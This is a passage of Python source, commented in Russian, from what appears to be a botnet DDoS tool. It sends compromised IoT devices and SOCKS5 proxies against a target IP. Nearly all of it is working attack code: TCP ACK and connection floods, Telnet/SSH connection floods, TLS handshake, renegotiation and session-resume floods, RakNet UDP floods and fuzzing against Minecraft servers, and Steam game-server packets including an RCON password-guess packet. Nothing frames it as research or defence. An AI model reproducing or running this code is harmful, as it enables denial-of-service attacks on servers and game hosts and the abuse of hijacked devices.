                        # print(f"❌ {device.ip} ошибка отправки: {e}")  # Убрал спам ошибок
                        time.sleep(0.01)
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} завершил: {ack_packets_sent} ACK пакетов ({mb_sent:.2f} МБ), ошибок: {failed_packets}")
                return ack_packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Критическая ошибка у {device.ip}: {e}")
                return 0, 0

        def fallback_tcp_attack(device):
            """Фолбэк атака через обычные TCP соединения"""
            connections_made = 0
            failed_connections = 0
            
            try:
                print(f"🔄 {device.ip} использует TCP Connection Flood (фолбэк)...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Быстро создаем и закрываем TCP соединения
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((target_ip, target_port))
                        
                        # Отправляем данные
                        sock.send(b"ACK / HTTP/1.1\r\n\r\n")
                        time.sleep(0.05)
                        sock.close()
                        
                        connections_made += 1
                        attack_stats['ack_packets_sent'] += 1
                        
                        if connections_made % 50 == 0:
                            print(f"🔗 {device.ip} создал {connections_made} TCP соединений")
                        
                        time.sleep(0.01)
                        
                    except Exception:
                        failed_connections += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                print(f"✅ {device.ip} создал {connections_made} TCP соединений, ошибок: {failed_connections}")
                return connections_made, 0
                
            except Exception as e:
                print(f"❌ Фолбэк ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        print("🚀 Запуск TCP ACK Flood...")
        results = self._run_attack(all_active_bots, attack_stats, ack_flood_attack, "TCP ACK Flood", max_workers=max_workers)
        
        # Статистика атаки
        attack_duration = time.time() - attack_stats['start_time']
        total_mb = attack_stats['bytes_sent'] / 1024 / 1024
        packets_per_second = attack_stats['ack_packets_sent'] / attack_duration if attack_duration > 0 else 0
        
        print(f"\n📊 TCP ACK Flood результаты:")
        print(f"🎯 Цель: {target_ip}:{target_port}")
        print(f"📦 ACK пакетов отправлено: {attack_stats['ack_packets_sent']:,}")
        print(f"💾 Всего данных: {total_mb:.2f} MB")
        print(f"⚡ Скорость: {packets_per_second:.0f} пакетов/сек")
        print(f"❌ Ошибок: {attack_stats['failed_packets']}")
        print(f"⏱️ Длительность: {attack_duration:.2f} сек")
        
        return results

    def multi_stage_connection_flood(self, target_ip, target_port=23, duration=60, stages=3):
        """Multi-Stage Connection Flood для Telnet/SSH серверов"""
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_cycles': 0,
            'failed_cycles': 0,
            'banners_received': 0,
            'auth_attempts': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def multi_stage_attack(device):
            successful_cycles = 0
            failed_cycles = 0
            
            try:
                print(f"🎭 {device.ip} начинает Multi-Stage Flood атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Стадия 1: Установка соединения и получение баннера
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(8)
                        sock.connect((target_ip, target_port))
                        
                        # Чтение баннера (если есть)
                        banner = b""
                        try:
                            sock.settimeout(2)
                            banner = sock.recv(1024)
                            if banner:
                                attack_stats['banners_received'] += 1
                        except socket.timeout:
                            pass
                        
                        # Стадия 2: Имитация начала аутентификации (для SSH/Telnet)
                        if target_port == 22:  # SSH
                            # SSH инициализация
                            sock.send(b"SSH-2.0-OpenSSH_7.4\r\n")
                        elif target_port == 23:  # Telnet  
                            # Telnet negotiation
                            sock.send(b"\xFF\xFB\x01\xFF\xFB\x03\xFF\xFD\x18")  # WILL ECHO, WILL SUPPRESS GO AHEAD, DO TERMINAL TYPE
                        
                        time.sleep(0.05)  # Даем время на обработку
                        
                        # Стадия 3: Попытка аутентификации (создание нагрузки)
                        if target_port == 22:  # SSH
                            # Имитация начала key exchange
                            sock.send(b"\x00\x00\x01\x14")  # Пример заголовка пакета
                        elif target_port == 23:  # Telnet
                            # Попытка логина
                            sock.send(b"admin\r\n")
                            attack_stats['auth_attempts'] += 1
                        
                        time.sleep(0.1)  # Задержка для создания нагрузки на CPU
                        
                        # Резкое закрытие соединения
                        sock.close()
                        
                        successful_cycles += 1
                        attack_stats['total_cycles'] += 1
                        
                        # Короткая пауза между циклами
                        time.sleep(0.05)
                        
                    except Exception as e:
                        failed_cycles += 1
                        attack_stats['failed_cycles'] += 1
                        continue
                
                print(f"✅ {device.ip} завершил {successful_cycles} циклов, ошибок: {failed_cycles}")
                return successful_cycles, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Запуск атаки
        results = self._run_attack(all_active_bots, attack_stats, multi_stage_attack, "Multi-Stage Flood")
        
        # Статистика
        print(f"\n📊 Multi-Stage Flood результаты:")
        print(f"   Всего циклов: {attack_stats['total_cycles']}")
        print(f"   Получено баннеров: {attack_stats['banners_received']}") 
        print(f"   Попыток аутентификации: {attack_stats['auth_attempts']}")
        print(f"   Ошибок: {attack_stats['failed_cycles']}")
        
        return results


    def banner_grabbing_flood(self, target_ip, target_port=23, duration=60):
        """Специализированный Banner Grabbing Flood"""
        
        all_active_bots = [d for d in self.iot_bots + self.socks5_bots if d.is_alive]
        
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0

        attack_stats = {
            'banners_grabbed': 0,
            'connections_made': 0,
            'failed_connections': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def banner_grab_attack(device):
            banners = 0
            connections = 0
            failed = 0
            
            try:
                print(f"🎯 {device.ip} начинает Banner Grabbing Flood...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Быстрое подключение-отключение с получением баннера
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((target_ip, target_port))
                        
                        connections += 1
                        attack_stats['connections_made'] += 1
                        
                        # Немедленное чтение баннера
                        sock.settimeout(1)
                        try:
                            banner = sock.recv(512)
                            if banner:
                                banners += 1
                                attack_stats['banners_grabbed'] += 1
                        except socket.timeout:
                            pass
                        
                        # Быстрое закрытие
                        sock.close()
                        
                        # Очень короткая пауза для максимальной скорости
                        time.sleep(0.02)
                        
                    except Exception:
                        failed += 1
                        attack_stats['failed_connections'] += 1
                        continue
                
                print(f"✅ {device.ip} получил {banners} баннеров, соединений: {connections}")
                return banners, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, banner_grab_attack, "Banner Grab Flood")
        
        print(f"\n📊 Banner Grabbing Flood результаты:")
        print(f"   Соединений установлено: {attack_stats['connections_made']}")
        print(f"   Баннеров получено: {attack_stats['banners_grabbed']}")
        print(f"   Эффективность: {(attack_stats['banners_grabbed']/attack_stats['connections_made']*100 if attack_stats['connections_made'] > 0 else 0):.1f}%")
        
        return results

    def tls_ssl_flood(self, target_ip, target_port=443, duration=60):
        """TLS/SSL handshake flood атака"""
        print(f"🔒 Запуск TLS/SSL flood атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        # ИСПРАВЛЕНИЕ: используем all_active_bots вместо active_devices
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'total_handshakes': 0,
            'failed_handshakes': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def tls_flood_attack(device):
            handshakes_completed = 0
            failed_handshakes = 0
            
            try:
                print(f"🔒 {device.ip} начинает TLS/SSL атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем SSL контекст
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        # SSL handshake
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
                        ssl_sock.connect((target_ip, target_port))
                        
                        handshakes_completed += 1
                        attack_stats['total_handshakes'] += 1
                        
                        # Закрываем соединение
                        ssl_sock.close()
                        
                        time.sleep(0.5)  # Задержка между handshakes
                        
                    except Exception:
                        failed_handshakes += 1
                        attack_stats['failed_handshakes'] += 1
                        continue
                
                print(f"✅ {device.ip} выполнил {handshakes_completed} TLS handshakes, ошибок: {failed_handshakes}")
                return handshakes_completed, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # ИСПРАВЛЕНИЕ: используем all_active_bots
        return self._run_attack(all_active_bots, attack_stats, tls_flood_attack, "TLS/SSL")

    def ssl_renegotiation_attack(self, target_ip, target_port=443, duration=60):
        """SSL Renegotiation атака - максимальная нагрузка на CPU"""
        print(f"🔄 Запуск SSL Renegotiation атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'total_renegotiations': 0,
            'failed_renegotiations': 0,
            'successful_connections': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def renegotiation_attack(device):
            renegotiations_completed = 0
            failed_renegotiations = 0
            connections_made = 0
            
            try:
                print(f"🔄 {device.ip} начинает SSL Renegotiation атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем SSL контекст
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        # Устанавливаем первоначальное SSL соединение
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(15)
                        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
                        ssl_sock.connect((target_ip, target_port))
                        
                        connections_made += 1
                        attack_stats['successful_connections'] += 1
                        
                        # Выполняем множественные ренегоциации в одном соединении
                        for i in range(10):  # 10 ренегоциаций на соединение
                            try:
                                # Принудительная ренегоциация SSL сессии
                                ssl_sock.renegotiate()
                                renegotiations_completed += 1
                                attack_stats['total_renegotiations'] += 1
                                
                                # Короткая пауза между ренегоциациями
                                time.sleep(0.1)
                                
                            except ssl.SSLError as e:
                                if "no renegotiation" in str(e).lower():
                                    # Сервер не поддерживает ренегоциацию
                                    break
                                failed_renegotiations += 1
                                attack_stats['failed_renegotiations'] += 1
                                break
                            except Exception:
                                failed_renegotiations += 1
                                attack_stats['failed_renegotiations'] += 1
                                break
                        
                        # Закрываем соединение
                        ssl_sock.close()
                        time.sleep(0.2)  # Пауза перед новым соединением
                        
                    except Exception:
                        failed_renegotiations += 1
                        attack_stats['failed_renegotiations'] += 1
                        continue
                
                print(f"✅ {device.ip}: {renegotiations_completed} ренегоциаций, {connections_made} соединений")
                return renegotiations_completed, connections_made
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, renegotiation_attack, "SSL Renegotiation")
        
        # Статистика атаки
        print(f"\n📊 SSL Renegotiation результаты:")
        print(f"   Всего ренегоциаций: {attack_stats['total_renegotiations']}")
        print(f"   Успешных соединений: {attack_stats['successful_connections']}")
        print(f"   Ошибок ренегоциации: {attack_stats['failed_renegotiations']}")
        
        return results


    def tls_session_resume_flood(self, target_ip, target_port=443, duration=60):
        """TLS Session Resume Flood - атака на кеш сессий"""
        print(f"💾 Запуск TLS Session Resume Flood на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'session_resumes': 0,
            'failed_resumes': 0,
            'full_handshakes': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def session_resume_attack(device):
            resumes_completed = 0
            failed_resumes = 0
            handshakes_completed = 0
            
            try:
                print(f"💾 {device.ip} начинает TLS Session Resume атаку...")
                start_time = time.time()
                
                # Создаем SSL контекст с поддержкой сессий
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Включаем поддержку возобновления сессий
                context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
                
                session_cache = []
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Фаза 1: Полный handshake для получения сессии
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
                        ssl_sock.connect((target_ip, target_port))
                        
                        # Получаем ID сессии для последующего возобновления
                        session_id = ssl_sock.session
                        if session_id:
                            session_cache.append(session_id)
                        
                        handshakes_completed += 1
                        attack_stats['full_handshakes'] += 1
                        ssl_sock.close()
                        
                        # Фаза 2: Попытки возобновления сессий
                        for session in session_cache[-5:]:  # Последние 5 сессий
                            try:
                                # Создаем новое соединение с попыткой возобновления сессии
                                new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                new_sock.settimeout(8)
                                
                                # Устанавливаем сессию для возобновления
                                new_ssl_sock = context.wrap_socket(new_sock, server_hostname=target_ip)
                                new_ssl_sock.connect((target_ip, target_port))
                                
                                resumes_completed += 1
                                attack_stats['session_resumes'] += 1
                                new_ssl_sock.close()
                                
                                time.sleep(0.1)
                                
                            except Exception:
                                failed_resumes += 1
                                attack_stats['failed_resumes'] += 1
                                continue
                        
                        # Ограничиваем размер кеша сессий
                        if len(session_cache) > 20:
                            session_cache = session_cache[-10:]
                        
                        time.sleep(0.3)  # Пауза между циклами
                        
                    except Exception:
                        failed_resumes += 1
                        attack_stats['failed_resumes'] += 1
                        continue
                
                print(f"✅ {device.ip}: {resumes_completed} возобновлений, {handshakes_completed} handshakes")
                return resumes_completed, handshakes_completed
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, session_resume_attack, "TLS Session Resume")
        
        # Статистика атаки
        print(f"\n📊 TLS Session Resume результаты:")
        print(f"   Успешных возобновлений: {attack_stats['session_resumes']}")
        print(f"   Полных handshakes: {attack_stats['full_handshakes']}")
        print(f"   Ошибок возобновления: {attack_stats['failed_resumes']}")
        
        return results

    def _create_raknet_unconnected_ping(self):
        """Создает RakNet Unconnected Ping пакет"""
        # RakNet magic bytes
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        
        # Packet ID для Unconnected Ping
        packet_id = b'\x01'
        
        # Ping time (current timestamp)
        ping_time = struct.pack('!Q', int(time.time() * 1000))
        
        # Client GUID (случайный)
        client_guid = struct.pack('!Q', random.randint(1, 2**64-1))
        
        return packet_id + ping_time + magic + client_guid

    def _create_raknet_open_connection_request_1(self):
        """Создает RakNet Open Connection Request 1 пакет"""
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        packet_id = b'\x05'  # Open Connection Request 1
        protocol_version = b'\x06'  # RakNet protocol version
        mtu_size = b'\x00' * 1466  # MTU padding
        
        return packet_id + magic + protocol_version + mtu_size

    def _create_raknet_open_connection_request_2(self):
        """Создает RakNet Open Connection Request 2 пакет"""
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        packet_id = b'\x07'  # Open Connection Request 2
        client_address = socket.inet_aton("127.0.0.1") + struct.pack('!H', 19132)
        mtu_size = struct.pack('!H', 1492)  # MTU size
        client_guid = struct.pack('!Q', random.randint(1, 2**64-1))
        
        return packet_id + magic + client_address + mtu_size + client_guid

    def _create_raknet_connection_request(self):
        """Создает RakNet Connection Request пакет"""
        packet_id = b'\x09'  # Connection Request
        client_guid = struct.pack('!Q', random.randint(1, 2**64-1))
        timestamp = struct.pack('!Q', int(time.time() * 1000))
        security = b'\x00'  # No security
        
        return packet_id + client_guid + timestamp + security

    def _create_raknet_new_incoming_connection(self):
        """Создает поддельный New Incoming Connection пакет"""
        packet_id = b'\x13'  # New Incoming Connection
        server_address = socket.inet_aton("127.0.0.1") + struct.pack('!H', 19132)
        system_addresses = b''
        for i in range(20):  # 20 system addresses
            system_addresses += socket.inet_aton(f"127.0.0.{i+1}") + struct.pack('!H', 19132)
        request_timestamp = struct.pack('!Q', int(time.time() * 1000))
        accepted_timestamp = struct.pack('!Q', int(time.time() * 1000))
        
        return packet_id + server_address + system_addresses + request_timestamp + accepted_timestamp

    def _create_raknet_data_packet(self):
        """Создает RakNet Data Packet с фейковыми данными"""
        packet_id = b'\x84'  # Data packet with ACK
        sequence_number = struct.pack('!L', random.randint(1, 2**24-1))
        flags = b'\x00'
        
        # Создаем фейковые игровые данные
        game_data = b''
        for i in range(random.randint(5, 20)):
            # Имитация игровых пакетов
            game_packet_type = random.choice([b'\x90', b'\x91', b'\x92', b'\x93'])  # Фейковые типы пакетов
            game_packet_data = os.urandom(random.randint(10, 100))
            game_data += game_packet_type + game_packet_data
        
        return packet_id + sequence_number + flags + game_data

    def _create_raknet_invalid_packets(self):
        """Создает невалидные RakNet пакеты для фаззинга"""
        invalid_packets = [
            # Неправильные magic bytes
            b'\x00' * 16 + b'\x01' + struct.pack('!Q', int(time.time() * 1000)),
            # Слишком короткие пакеты
            b'\x01',
            b'\x05\x00\xff\xff',
            # Случайные данные
            os.urandom(random.randint(10, 100)),
            # Переполненные пакеты
            b'\x01' + b'A' * 10000,
            # Неправильные ID пакетов
            b'\xFF' + os.urandom(50),
            b'\x00' + os.urandom(50),
        ]
        return random.choice(invalid_packets)

    def _analyze_raknet_response(self, response):
        """Анализирует RakNet ответ на наличие аномалий"""
        if not response or len(response) < 1:
            return False
        
        # Признаки проблем в RakNet
        indicators = [
            b'exception',
            b'error',
            b'crash',
            b'invalid',
            b'corrupt',
            b'timeout',
        ]
        
        response_lower = response.lower()
        for indicator in indicators:
            if indicator in response_lower:
                return True
        
        # Проверяем нестандартные коды ошибок
        if len(response) == 1 and response[0] not in [0x00, 0x01, 0x05, 0x06, 0x07, 0x08, 0x09, 0x13, 0x84]:
            return True
            
        return False

    def raknet_udp_flood(self, target_ip, target_port=19132, duration=60):
        """RakNet UDP flood атака для игровых серверов (Minecraft и другие)"""
        print(f"🎮 Запуск RakNet UDP flood атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'connection_attempts': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def raknet_attack_single(device):
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            connection_attempts = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"🎮 {bot_type} {device.ip} начинает RakNet UDP атаку...")
                start_time = time.time()
                
                # Создаем UDP сокет
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                # Список RakNet пакетов для атаки
                raknet_packets = [
                    ('unconnected_ping', self._create_raknet_unconnected_ping),
                    ('open_connection_1', self._create_raknet_open_connection_request_1),
                    ('open_connection_2', self._create_raknet_open_connection_request_2),
                    ('connection_request', self._create_raknet_connection_request),
                    ('new_incoming', self._create_raknet_new_incoming_connection),
                    ('data_packet', self._create_raknet_data_packet),
                ]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный тип RakNet пакета
                        packet_type, packet_creator = random.choice(raknet_packets)
                        
                        # Создаем пакет
                        raknet_packet = packet_creator()
                        
                        # Отправляем пакет
                        sock.sendto(raknet_packet, (target_ip, target_port))
                        
                        packets_sent += 1
                        bytes_sent += len(raknet_packet)
                        
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(raknet_packet)
                        
                        # Считаем попытки соединения
                        if packet_type in ['open_connection_1', 'open_connection_2', 'connection_request']:
                            connection_attempts += 1
                            attack_stats['connection_attempts'] += 1
                        
                        # Периодически проверяем ответы (для реалистичности)
                        if random.random() < 0.1:
                            try:
                                response = sock.recv(1024)
                                # Если получили ответ, можно отправить follow-up пакет
                                if response and len(response) > 0:
                                    if random.random() > 0.5:
                                        follow_up_packet = self._create_raknet_data_packet()
                                        sock.sendto(follow_up_packet, (target_ip, target_port))
                                        packets_sent += 1
                                        bytes_sent += len(follow_up_packet)
                            except socket.timeout:
                                pass  # Таймаут - нормально для флуда
                        
                        # Разная скорость для разных типов ботов
                        if device.bot_type == "socks5":
                            time.sleep(random.uniform(0.05, 0.2))
                        else:
                            time.sleep(random.uniform(0.01, 0.05))
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"✅ {bot_type} {device.ip} отправил {packets_sent} RakNet пакетов "
                      f"({mb_sent:.2f} МБ), попыток соединения: {connection_attempts}")
                
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(all_active_bots, attack_stats, raknet_attack_single, "RakNet UDP")

    def raknet_protocol_fuzzing(self, target_ip, target_port=19132, duration=60):
        """RakNet Protocol Fuzzing - отправка невалидных пакетов"""
        print(f"🧪 Запуск RakNet Protocol Fuzzing на {target_ip}:{target_port}")
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return 0

        attack_stats = {
            'total_fuzz_packets': 0,
            'total_bytes': 0,
            'crash_attempts': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def raknet_fuzzing_attack(device):
            fuzz_packets_sent = 0
            bytes_sent = 0
            crash_attempts = 0
            
            try:
                print(f"🧪 {device.ip} начинает RakNet fuzzing атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 80% невалидных пакетов, 20% валидных но с поврежденными данными
                        if random.random() < 0.8:
                            fuzz_packet = self._create_raknet_invalid_packets()
                        else:
                            # Валидный пакет с поврежденными данными
                            base_packet = self._create_raknet_unconnected_ping()
                            # Повреждаем случайные байты
                            packet_bytes = bytearray(base_packet)
                            for _ in range(random.randint(1, 5)):
                                if len(packet_bytes) > 0:
                                    pos = random.randint(0, len(packet_bytes) - 1)
                                    packet_bytes[pos] = random.randint(0, 255)
                            fuzz_packet = bytes(packet_bytes)
                        
                        sock.sendto(fuzz_packet, (target_ip, target_port))
                        
                        fuzz_packets_sent += 1
                        bytes_sent += len(fuzz_packet)
                        crash_attempts += 1
                        
                        attack_stats['total_fuzz_packets'] += 1
                        attack_stats['total_bytes'] += len(fuzz_packet)
                        attack_stats['crash_attempts'] += 1
                        
                        # Проверяем ответы на аномалии
                        if random.random() < 0.05:
                            try:
                                response = sock.recv(1024)
                                if self._analyze_raknet_response(response):
                                    print(f"🎯 {device.ip}: Обнаружена аномалия в RakNet ответе!")
                            except socket.timeout:
                                pass
                        
                        time.sleep(random.uniform(0.1, 0.5))
                        
                    except Exception:
                        continue
                
                sock.close()
                
                print(f"✅ {device.ip} отправил {fuzz_packets_sent} fuzzing пакетов, "
                      f"попыток краша: {crash_attempts}")
                
                return fuzz_packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(iot_bots, attack_stats, raknet_fuzzing_attack, "RakNet Fuzzing")

    def smart_raknet_combo_attack(self, target_ip, target_port=19132, duration=60):
        """Умная комбинированная RakNet атака"""
        print(f"💥 Запуск комбинированной RakNet атаки на {target_ip}:{target_port}")
        
        attack_stats = {
            'flood_packets': 0,
            'fuzzing_packets': 0,
            'total_impact': 0,
            'start_time': time.time()
        }
        
        # Запускаем обе атаки параллельно
        import threading
        
        def run_flood_attack():
            try:
                result = self.raknet_udp_flood(target_ip, target_port, duration)
                attack_stats['flood_packets'] = result if result else 0
            except Exception as e:
                print(f"❌ Ошибка RakNet Flood: {e}")

        def run_fuzzing_attack():
            try:
                result = self.raknet_protocol_fuzzing(target_ip, target_port, duration)
                attack_stats['fuzzing_packets'] = result if result else 0
            except Exception as e:
                print(f"❌ Ошибка RakNet Fuzzing: {e}")

        flood_thread = threading.Thread(target=run_flood_attack)
        fuzzing_thread = threading.Thread(target=run_fuzzing_attack)
        
        flood_thread.daemon = True
        fuzzing_thread.daemon = True
        
        flood_thread.start()
        fuzzing_thread.start()
        
        flood_thread.join(timeout=duration + 10)
        fuzzing_thread.join(timeout=duration + 10)
        
        attack_stats['total_impact'] = attack_stats['flood_packets'] + attack_stats['fuzzing_packets']
        
        print(f"\n🎯 РЕЗУЛЬТАТЫ КОМБИНИРОВАННОЙ RAKNET АТАКИ:")
        print(f"🌊 Flood пакетов: {attack_stats['flood_packets']}")
        print(f"🧪 Fuzzing пакетов: {attack_stats['fuzzing_packets']}")
        print(f"💥 Общий impact: {attack_stats['total_impact']}")
        
        return attack_stats['total_impact']

    def _create_steam_connect_packet(self):
        """Создает Steam connect packet (A2S_CONNECT)"""
        # Steam packet header
        header = b'\xFF\xFF\xFF\xFF'
        # Connect command
        command = b'connect'
        # Protocol version (Source = 7, Source 2009+ = 17)
        version = struct.pack('<I', 17)
        # Auth challenge
        challenge = b'\xFF\xFF\xFF\xFF'
        # Client name
        name = b'SteamFloodBot\x00'
        
        return header + command + version + challenge + name

    def _create_steam_challenge_packet(self):
        """Создает Steam challenge packet"""
        header = b'\xFF\xFF\xFF\xFF'
        command = b'getchallenge'
        challenge_type = b'\x73'  # 's' for steam
        
        return header + command + challenge_type

    def _create_steam_auth_packet(self):
        """Создает Steam auth packet"""
        header = b'\xFF\xFF\xFF\xFF'
        command = b'auth'
        # Steam ID (random)
        steam_id = struct.pack('<Q', random.randint(10000000000000000, 99999999999999999))
        # Game ID (CS:GO = 730, CS2 = ???)
        game_id = struct.pack('<I', 730)
        # Auth token (random)
        auth_token = os.urandom(32)
        
        return header + command + steam_id + game_id + auth_token

    def _create_steam_datagram_packet(self):
        """Создает Steam datagram packet"""
        header = b'\xFF\xFF\xFF\xFF'
        command = b'datagram'
        # Random connection ID
        connection_id = struct.pack('<I', random.randint(1, 1000000))
        # Sequence number
        sequence = struct.pack('<I', random.randint(1, 10000))
        # Random data
        data = os.urandom(random.randint(50, 500))
        
        return header + command + connection_id + sequence + data

    def _create_steam_matchmaking_packet(self):
        """Создает Steam matchmaking packet"""
        header = b'\xFF\xFF\xFF\xFF'
        command = b'matchmaking'
        # Search criteria
        criteria = b'\\appid\\730\\gametype\\competitive\\map\\de_dust2\x00'
        
        return header + command + criteria

    def _create_steam_rcon_packet(self):
        """Создает Steam RCON packet"""
        header = b'\xFF\xFF\xFF\xFF'
        command = b'rcon'
        # RCON password attempt
        password = b'password123 '
        # RCON command
        rcon_command = b'sv_cheats 1; status; echo "steam_flood"\x00'
        
        return header + command + password + rcon_command

    def _create_steam_heartbeat_packet(self):
        """Создает Steam heartbeat packet"""
        header = b'\xFF\xFF\xFF\xFF'
        command = b'heartbeat'
        # Server info
        info = b'\\gamename\\csgo\\playercount\\0\\maxplayers\\10\x00'
        
        return header + command + info

    def _create_steam_invalid_packet(self):
        """Создает невалидные Steam пакеты"""
        invalid_packets = [
            # Слишком длинные пакеты
            b'\xFF\xFF\xFF\xFF' + b'A' * 2000,
            # Неправильные команды
            b'\xFF\xFF\xFF\xFFinvalid_command\x00',
            # Поврежденные пакеты
            b'\xFF\xFF\xFF' + os.urandom(100),
            # Пустые пакеты
            b'\xFF\xFF\xFF\xFF\x00',
            # Binary garbage
            os.urandom(500),
        ]
        return random.choice(invalid_packets)

    def steam_protocol_flood(self, target_ip, target_port=27015, duration=60):
        """Steam Protocol Flood атака для CS2, Dota 2, TF2 и других Steam игр"""
        print(f"🚀 Запуск Steam Protocol Flood на {target_ip}:{target_port}")
        
